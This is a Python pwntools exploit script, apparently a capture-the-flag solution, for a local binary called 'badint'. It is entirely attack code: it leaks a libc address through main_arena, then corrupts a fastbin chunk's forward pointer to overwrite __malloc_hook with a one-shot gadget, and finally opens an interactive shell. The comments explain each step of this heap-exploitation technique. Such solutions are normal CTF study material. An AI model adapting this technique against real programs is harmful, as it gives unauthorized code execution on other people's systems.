#!/usr/bin/python
from pwn import *

p = process('./badint')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def set(seq, offset, data, LSF):
  p.recvuntil('SEQ #: ')
  p.sendline(str(seq))
  p.recvuntil('Offset: ')
  p.sendline(str(offset))
  p.recvuntil('Data: ')
  p.sendline(data)
  p.recvuntil('Yes/No: ')
  if LSF:
    p.sendline('Yes')
  else:
    p.sendline('No')

set(0, 8, 'a'*256, True) # leak main_arena + 88 address

p.recvuntil(']: ')
leak = u64(p.recvn(16).decode('hex'))
base = leak - 0x3c3b78
libc.address = base

gadget = base + 0x4526a

print hex(leak)

set(0, 0, 'b'*16*2, True) 
set(0, 0, 'c'*96*2, True) # make fastbin free chunk
set(0, 0x150, p64(libc.symbols['__malloc_hook'] - 35).encode('hex'), True) # overwrite fastbin free chunk's fd pointer. purpose of -35 is to set valid size 0x7f
set(1, 0, 'a'*6 + p64(gadget).encode('hex')*12 + 'a'*2, True) # overwrite malloc_hook with oneshot gadget
p.interactive()

